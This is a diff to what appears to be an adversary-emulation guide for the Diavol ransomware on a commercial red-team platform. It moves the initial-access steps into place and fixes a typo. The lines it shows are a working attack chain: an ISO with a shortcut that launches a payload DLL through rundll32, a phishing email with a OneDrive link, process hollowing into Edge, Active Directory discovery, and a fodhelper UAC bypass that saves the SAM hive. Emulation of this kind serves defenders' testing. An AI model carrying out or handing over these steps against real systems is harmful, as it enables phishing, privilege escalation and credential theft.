@@ -15,7 +15,15 @@ This is a multi-stage threat that requires multiple SCYTHE campaigns for end-to-
 7. Download payload in DLL format setting the entry-point to `BasicScore`
 8. Save the DLL as `SharedFiles.dll`
 9. Start Stage 1, 2, 3, and 4 before execution
-10. Follow steps for preparing initial access
+11. Copy the src folder from our [Compound Actions GitHub for T1553.005](https://github.com/scythe-io/compound-actions/tree/main/T1553.005%20-%20Mark-of-the-Web%20Bypass/src) to a working directory on your Windows system
+12. Put the SCYTHE DLL in the Folder2Iso of the working directory
+13. In the Folder2Iso directory, create a shortcut called `Documents` and set the `Target` to: `C:\Windows\System32\rundll32.exe SharedFiles.dll,BasicScore`
+14. Open a Windows command prompt and cd to the working directory
+15. Run `Folder2Iso.exe "Folder2Iso" "%USERPROFILE%\Downloads\new-documents-2005.iso" "Diavol" 0 0 0 "None"` This will take all the content of the Folder2Iso folder and create an ISO of it
+16. Zip the ISO and call it `new-documents-2005.zip`
+17. Upload the zip file to Microsoft OneDrive and copy the link
+18. Send a phishing email with the link to the Microsoft OneDrive zip file
+19. If the end user downloads the ZIP and double clicks the ISO, it will be mounted on their endpoint. The user will need to double click the shortcut to begin execution.
 
 ### Diavol Stage 1
 1. Create a new campaign `DiavolStage1` with HTTPS and the communication options from the CTI. You can import from the config.json on this GitHub or manually set it to: `--cp yourdomain[.]com:443 --secure true --multipart 10240 --heartbeat 5 --jitter 10`
@@ -48,23 +56,12 @@ This is a multi-stage threat that requires multiple SCYTHE campaigns for end-to-
 5. Save the EXE as `CryptoLocker64.exe`
 6. Upload the `CryptoLocker64.exe` to the VFS under VFS:/shared/Diavol
 
-### Initial Access
-1. Copy the src folder from our [Compound Actions GitHub for T1553.005](https://github.com/scythe-io/compound-actions/tree/main/T1553.005%20-%20Mark-of-the-Web%20Bypass/src) to a working directory on your Windows system. Note we are using the Folder2Iso project to create the ISO.
-2. Put the SCYTHE DLL in the Folder2Iso of the working directory.
-3. In the Folder2Iso directory, create a shortcut called `Documents` and set the `Target` to: `C:\Windows\System32\rundll32.exe SharedFiles.dll,BasicScore`
-4. Open a Windows command prompt and cd to the working directory.
-5. Run `Folder2Iso.exe "Folder2Iso" "%USERPROFILE%\Downloads\new-documents-2005.iso" "Diavol" 0 0 0 "None"` This will take all the content of the Folder2Iso folder and create an ISO of it.
-6. Zip the ISO and call it `new-documents-2005.zip`
-7. Upload the zip file to Microsoft OneDrive and copy the link.
-8. Send a phishing email with the link to the Microsoft OneDrive zip file. 
-9. If the end user downloads the ZIP and double clicks the ISO, it will be mounted on their endpoint. The user will need to double click the shortcut to begin execution.
-
 ## Manual Adversary Emulation
 This is a multi-stage attack leveraging multiple payloads and execution that perform different TTPs. Manual emulation steps are below.
 
 ### Diavol Stage 0
 1. Start a campaign, download the DLL with entry point of `BasicScore` and save as `ShareFiles.dll` 
-2. Copy the src folder from our [Compound Actions GitHub for T1553.005](https://github.com/scythe-io/compound-actions/tree/main/T1553.005%20-%20Mark-of-the-Web%20Bypass/src) to a working directory on your Windows system. Note we are using the Folder2Iso project to create the ISO.
+2. Copy the src folder from our [Compound Actions GitHub for T1553.005](https://github.com/scythe-io/compound-actions/tree/main/T1553.005%20-%20Mark-of-the-Web%20Bypass/src) to a working directory on your Windows system.
 3. Put the SCYTHE DLL in the Folder2Iso of the working directory.
 4. In the Folder2Iso directory, create a shortcut called `Documents` and set the `Target` to: `C:\Windows\System32\rundll32.exe SharedFiles.dll,BasicScore`
 5. Open a Windows command prompt and cd to the working directory.
@@ -74,11 +71,12 @@ This is a multi-stage attack leveraging multiple payloads and execution that per
 9. Send a phishing email with the link to the Microsoft OneDrive zip file. 
 10. If the end user downloads the ZIP and double clicks the ISO, it will be mounted on their endpoint. The user will need to double click the shortcut to begin execution.
 11. Load the process hollowing module: ```loader --load scythe.phollowing```
-12. Inject DiavolStage1 insto msedge: ```scythe.phollowing --src VFS:/shared/Diavol/DiavolStage1.exe --target "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"```
+12. Inject DiavolStage1 into msedge: ```scythe.phollowing --src VFS:/shared/Diavol/DiavolStage1.exe --target "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"```
+13. Shutdown Diavol Stage 0: ```controller --shutdown```
 
 ### Diavol Stage 1
+Manual execution of discovery activity started 14 minutes after initial access:
 ```
-delay --time 900
 loader --load run
 run net group /domain
 run net group /domain "Domain Admins"
@@ -86,6 +84,9 @@ run net group "Domain Computers" /domain
 run net localgroup administrators
 run net view /all
 run nltest /domain_trusts /all_trusts
+```
+59 minutes after discovery, another payload was dropped and executed: 
+```
 delay --time 6000
 loader --load downloader
 downloader --src "VFS:/shared/Diavol/tfpkuengdlu.dll" --dest "%USERPROFILE%\AppData\Local\Temp\tfpkuengdlu.dll"
@@ -95,7 +96,6 @@ controller --shutdown
 
 ### Diavol Stage 2
 Create adf.bat and upload to VFS:/shared/Diavol/adf.bat
-
 ```
 %USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -f "(objectcategory=person)" > %USERPROFILE%\Desktop\Diavol\adfind\results\ad-users.txt
 %USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -f "objectcategory=computer" > %USERPROFILE%\Desktop\Diavol\adfind\results\ad_computers.txt
@@ -106,7 +106,6 @@ Create adf.bat and upload to VFS:/shared/Diavol/adf.bat
 %USERPROFILE%\Desktop\Diavol\adfind\AdFind.exe -gcb -sc trustdmp > %USERPROFILE%\Desktop\Diavol\adfind\results\ad_trustdmp2.txt
 ```
 Create fodhelper_reg_hashes.bat  and upload to VFS:/shared/Diavol/fodhelper_reg_hashes.bat
-
 ```
 reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\sam c:\ProgramData\sam.save" /f
 reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
@@ -135,7 +134,6 @@ downloader --src "VFS:/shared/Diavol/adf.bat" --dest "%USERPROFILE%\Desktop\Diav
 downloader --src "https://www.joeware.net/downloads/files/AdFind.zip" --dest "%USERPROFILE%\Desktop\Diavol\adfind\AdFind.zip"
 run cmd /c powershell -Command Expand-Archive %USERPROFILE%\Desktop\Diavol\adfind\AdFind.zip -DestinationPath %USERPROFILE%\Desktop\Diavol\adfind\
 run cmd /c "start %USERPROFILE%\Desktop\Diavol\adfind\adf.bat"
-delay --time 600
 loader --load downloader
 downloader --src "VFS:/shared/Diavol/fodhelper_reg_hashes.bat" --dest "%USERPROFILE%\Desktop\Diavol\fodhelper_reg_hashes.bat"
 run cmd /c "start %USERPROFILE%\Desktop\Diavol\fodhelper_reg_hashes.bat"
@@ -150,7 +148,6 @@ controller --shutdown
 
 ### Diavol Stage 3
 After 18 hours, the following was executed:
-
 ```
 loader --load run
 run net group "Domain Admins" /domain
